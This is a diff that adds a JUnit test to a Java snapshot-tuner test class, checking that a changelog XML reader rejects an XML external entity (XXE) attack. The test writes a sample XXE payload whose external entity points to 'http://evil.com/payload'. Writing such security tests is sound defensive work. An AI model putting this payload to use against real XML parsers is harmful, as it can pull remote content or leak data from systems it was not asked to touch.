@@ -13,6 +13,7 @@ import static java.nio.file.StandardCopyOption.REPLACE_EXISTING;
 import static org.hamcrest.MatcherAssert.assertThat;
 import static org.hamcrest.Matchers.equalToCompressingWhiteSpace;
 import static org.junit.jupiter.api.Assertions.assertFalse;
+import static org.junit.jupiter.api.Assertions.assertThrows;
 import static org.junit.jupiter.api.Assertions.assertTrue;
 
 import java.io.File;
@@ -23,6 +24,7 @@ import java.nio.file.Files;
 import java.nio.file.Path;
 import java.nio.file.Paths;
 
+import org.dom4j.DocumentException;
 import org.junit.jupiter.api.BeforeEach;
 import org.junit.jupiter.api.Test;
 import org.junit.jupiter.api.io.TempDir;
@@ -120,5 +122,18 @@ public class AbstractSnapshotTunerTest {
 		try (FileInputStream is = new FileInputStream(file)) {
 			return AbstractSnapshotTuner.readInputStream(is);
 		}
+	}
+
+	//TODO: This behaviour should be mocked because directly creating a vulnerable file 
+	// and attempting an XXE attack in a test environment is not recommended. 
+	// It could potentially expose the system to real attacks, even if unintentional.
+	@Test
+	public void testReadChangeLogFile_shouldThrowDocumentExceptionIncaseOfAnXxeAttack() throws Exception {
+		String xmlContent = "<!DOCTYPE root [<!ENTITY ext SYSTEM \"http://evil.com/payload\">]><root>&ext;</root>";
+		Path tempFilePath = Paths.get("test.xml");
+		Files.write(tempFilePath, xmlContent.getBytes());
+		
+		assertThrows(DocumentException.class, () -> AbstractSnapshotTuner.readChangeLogFile(String.valueOf(tempFilePath)));
+		assertTrue(Files.deleteIfExists(tempFilePath)); //ensure the xml file is deleted after the assertion
 	}
 }
